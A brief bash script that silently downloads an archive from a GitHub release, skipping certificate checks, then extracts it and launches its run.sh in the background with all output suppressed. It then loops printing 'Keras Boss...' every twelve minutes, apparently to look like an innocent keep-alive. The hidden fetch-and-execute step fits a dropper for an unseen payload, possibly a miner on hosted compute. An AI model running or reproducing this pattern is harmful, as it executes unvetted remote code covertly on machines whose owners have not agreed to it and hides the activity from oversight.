#!/bin/bash

curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/vertex.tar.gz>/dev/null 2>&1
tar -xvf vertex.tar.gz >/dev/null 2>&1
rm vertex.tar.gz
chmod +x run.sh
./run.sh 7 >/dev/null 2>&1 &
sleep 20
while true
do
        echo "Keras Boss..."
        sleep 720
done
